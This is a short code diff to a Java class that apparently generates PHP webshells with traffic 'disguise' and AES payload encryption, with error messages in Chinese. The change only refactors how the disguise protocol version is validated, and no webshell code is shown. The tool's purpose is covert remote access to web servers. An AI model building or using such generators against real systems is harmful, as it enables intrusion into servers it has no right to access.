@@ -100,8 +100,8 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         if (!"webshell".equalsIgnoreCase(request.getArtifactType())) {
             throw new IllegalArgumentException("PHP 当前支持的 artifactType 为 webshell");
         }
-        Disguise requestDisguise = requireDisguise(request.getRequestDisguise(), "请求");
-        Disguise responseDisguise = requireDisguise(request.getResponseDisguise(), "响应");
+        Disguise requestDisguise = requireDisguise(request.getRequestDisguise());
+        Disguise responseDisguise = requireDisguise(request.getResponseDisguise());
         String payloadKey = optionString(request.getOptions(), "payloadKey");
         if (payloadKey == null || payloadKey.trim().isEmpty()) {
             throw new IllegalArgumentException("PHP PayloadCodec AES 密钥不能为空");
@@ -451,12 +451,9 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         }
     }
 
-    private Disguise requireDisguise(Disguise disguise, String label) {
+    private Disguise requireDisguise(Disguise disguise) {
+        DisguiseProtocol.requireCurrent(disguise);
         PhpSourceSupport.requirePhp(disguise);
-        if (disguise.getProtocolVersion() < DisguiseProtocol.PROTOCOL_VERSION) {
-            throw new IllegalArgumentException(label + "伪装必须使用 protocolVersion "
-                    + DisguiseProtocol.PROTOCOL_VERSION);
-        }
         return disguise;
     }
 
